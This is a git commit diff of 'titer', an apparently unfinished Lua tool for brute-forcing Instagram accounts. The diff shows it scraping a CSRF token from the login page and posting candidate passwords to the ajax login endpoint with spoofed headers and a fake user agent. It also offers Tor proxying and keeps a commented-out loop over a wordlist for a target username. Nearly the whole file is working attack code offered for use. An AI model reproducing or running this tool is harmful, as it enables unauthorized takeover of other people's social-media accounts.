24b6533d7a5881b758eac781d20dc0418918a85e
sudurraaa <sudurrahah@protonmail.com>
2022-04-26 00:40:25 +0400

    main part dided, i just need to implement proxy support

--- titer.lua
+++ titer.lua
@@ -1,21 +1,9 @@
 #!/usr/bin/lua
-local argparse = require('argparse')
-local http = require('socket.http')
+local argparse = require('argparse') 
+local http = require('socket.http') 
 local ltn = require('ltn12')
+local lib = require("lib/lib")
 local json = require("cjson")
-
-local request_payload = [[queryParams={}&optIntoOneTap=false]]
-local request_headers = {
-	-- TODO add fake_agent() functin to generate random fake_agent
-     ["User-Agent"] = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
-     ["X-Requested-With"] = "XMLHttpRequest",
-     ["Referer"] = "http://www.instagram.com/accounts/login"
-}
-
-local function wait(time)
-    local timer = os.time()
-    repeat until os.time() > timer + time
-end
 
 local titer = [[
                 `         '
@@ -39,9 +27,20 @@ local titer = [[
   https://github.com/sudurraaa/titer
 ]]
 
+local request_payload = [[queryParams={}&optIntoOneTap=false]]
+local csrf = nil
+local request_headers = nil
 
 local function attack(password, tor)
+	-- Generating fake user agent
 	request_payload = request_payload .. "&enc_password=#PWD_INSTAGRAM_BROWSER:0:" .. os.time() .. ":sudopacmandeleteme17G"
+
+	print(request_payload)
+	Wait(3)
+	for x,v in pairs(request_headers) do
+		print(x .. " " .. v)
+	end
+
 	local attack_response = {}
 	http.request {
 		url = "https://instagram.com/accounts/login/ajax/",
@@ -50,65 +49,73 @@ local function attack(password, tor)
 		source = ltn.source.string(request_payload),
 		sink = ltn.sink.table(attack_response)
 	}
+
 	for _,resp in pairs(attack_response) do
-		local hack_req = json.encode(resp)
-		print(hack_req['"authenitcated"'])
+		print(resp)
 	end
 end
 
 local function main()
-	local parser = argparse() {
-		name = "titer",
-		description = titer,
-		epilog = "Usage: titer -t blackarch -w wordlist.txt -p disable"
-	}
-	parser:option('-t --target', "Specify target instagram username")
-	parser:option('-w --wordlist', "Specify wordlist file path")
-	parser:option('-p --proxy', "Enable or Disable tor service")
-		:choices {"enable", "disable"}
-	parser:flag('-v --version', "Get current version of soft"):action(function()
-		print("titer v1.0.0(alpha)")
-		os.exit(0)
-	end)
-	parser:flag('-a --asci', 'Print titer ascii'):action(function()
-		print(titer)
-		os.exit(0)
-	end)
-	local args = parser:parse()
-    request_payload = request_payload .. "&username=" .. args.target
-	-- Making http request to instagram to get csrf token
-	local body, code,headers = http.request {
-		url = "https://instagram.com/accounts/login/",
-		method = "GET",
-		headers = request_headers,
-	}
-	for _,cooks in pairs(headers) do
-		if cooks:find("csrftoken") then
-			local csrf = cooks:match('csrftoken=.*'):sub(11, -485)
-			request_headers["x-csrftoken"] = csrf
-			break
-		end
-	end
-	-- Checking if --wordlist exist TODO find better way with argparse
-	--[[local open = io.open(args.wordlist, 'r')
-	if open then
-		open:close()
-		for brute in io.lines(args.wordlist) do
-			attack(args.target, brute, args.proxy)
-		end
-	else
-		print("[-] " .. args.wordlist .. " file path doesn't found\n[+] trying to open" .. args.wordlist .. ".txt file")
-		local open_txt = io.open(args.wordlist .. ".txt")
-		if open_txt then
-			for brute in io.lines(args.wordlist .. ".txt") do
-				attack(args.target, brute, args.proxy)
-			end
-		else
-			print("[-] wordlist file path doesn't found")
-			os.exit(0)
-		end
-	end]]--
-	attack("sudopacmandeleteme", "sudopacmandeleteme17G", "disable")
+    local parser = argparse() {
+    	name = "titer",
+    	description = titer,
+    	epilog = "Usage: titer -t blackarch -w wordlist.txt -p disable"
+    }
+    parser:option('-t --target', "Specify target instagram username")
+    parser:option('-w --wordlist', "Specify wordlist file path")
+    parser:option('-p --proxy', "Enable or Disable tor service")
+    	:choices {"enable", "disable"}
+    parser:flag('-v --version', "Get current version of soft"):action(function()
+    	print("titer v1.0.0(alpha)")
+    	os.exit(0)
+    end)
+    parser:flag('-a --asci', 'Print titer ascii'):action(function()
+    	print(titer)
+    	os.exit(0)
+    end)
+    local args = parser:parse()
+    request_payload = request_payload .. "&username=sudopacmandeleteme"
+    -- Making http request to instagram to get csrf token
+    local body,code,headers = http.request {
+    	url = "https://instagram.com/accounts/login/",
+    	method = "GET",
+    	headers = request_headers,
+    }
+    for _,cooks in pairs(headers) do
+    	if cooks:find("csrftoken") then
+    		csrf = cooks:match('csrftoken=.*'):sub(11, -485)
+    		print(csrf)
+    		--request_headers["x-csrftoken"] = csrf
+    		break
+    	end
+    end
+    request_headers = {
+    	["content-type"] = "application/x-www-form-urlencoded",
+    	["X-Requested-With"] = "XMLHttpRequest",
+    	["Referer"] = "http://www.instagram.com/accounts/login",
+    	["x-csrftoken"] = csrf,
+    	["User-Agent"] = fake_Agents()
+    }
+    -- Checking if --wordlist exist TODO find better way with argparse
+    --[[local open = io.open(args.wordlist, 'r')
+    if open then
+    	open:close()
+    	for brute in io.lines(args.wordlist) do
+    		attack(args.target, brute, args.proxy)
+    	end
+    else
+    	print("[-] " .. args.wordlist .. " file path doesn't found\n[+] trying to open" .. args.wordlist .. ".txt file")
+    	local open_txt = io.open(args.wordlist .. ".txt")
+    	if open_txt then
+    		for brute in io.lines(args.wordlist .. ".txt") do
+    			attack(args.target, brute, args.proxy)
+    		end
+    	else
+    		print("[-] wordlist file path doesn't found")
+    		os.exit(0)
+    		end
+    end]]--
+    attack("sudopacmandeleteme", "sudopacmandeleteme17G", "disable")
 end
 
 main()
